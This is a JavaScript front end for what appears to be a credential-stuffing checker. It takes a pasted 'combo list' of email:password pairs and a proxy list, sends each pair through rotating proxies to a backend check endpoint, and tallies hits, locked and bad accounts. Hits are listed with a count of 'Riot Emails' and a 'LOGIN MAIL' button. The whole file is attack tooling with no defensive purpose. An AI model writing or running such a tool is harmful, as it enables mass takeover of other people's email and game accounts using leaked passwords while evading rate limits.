let isRunning = false;
let stats = { checked: 0, hit: 0, bad: 0, locked: 0 };

async function startChecking() {
    const combos = document.getElementById('inp-combos').value.split('\n').filter(c => c.includes(':'));
    const proxies = document.getElementById('inp-proxies').value.split('\n').filter(p => p.trim() !== '');
    
    if (combos.length === 0) return alert("Combo list empty!");

    isRunning = true;
    document.getElementById('start-btn').disabled = true;
    document.getElementById('stop-btn').disabled = false;

    for (let i = 0; i < combos.length; i++) {
        if (!isRunning) break;

        const combo = combos[i].trim();
        const proxy = proxies[i % proxies.length] || null;

        try {
            const res = await fetch('/api/check', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ combo, proxy })
            });
            const data = await res.json();

            stats.checked++;
            if (data.status === 'HIT') {
                stats.hit++;
                addTableRow(data, "badge-hit");
            } else if (data.status === 'LOCKED') {
                stats.locked++;
            } else {
                stats.bad++;
            }
            updateStats();
        } catch (e) {
            console.error(e);
        }
    }
}

function addTableRow(data, badgeClass) {
    const row = `<tr>
        <td>${data.combo.split(':')[0]}</td>
        <td><span class="${badgeClass}">${data.status}</span></td>
        <td>${data.count} Riot Emails</td>
        <td><button class="btn-primary" style="padding:5px 10px; font-size:10px">LOGIN MAIL</button></td>
    </tr>`;
    document.getElementById('res-table').innerHTML = row + document.getElementById('res-table').innerHTML;
}

function updateStats() {
    document.getElementById('s-checked').innerText = stats.checked;
    document.getElementById('s-hit').innerText = stats.hit;
    document.getElementById('s-bad').innerText = stats.bad;
    document.getElementById('s-locked').innerText = stats.locked;
}

document.getElementById('start-btn').onclick = startChecking;
document.getElementById('stop-btn').onclick = () => { isRunning = false; };
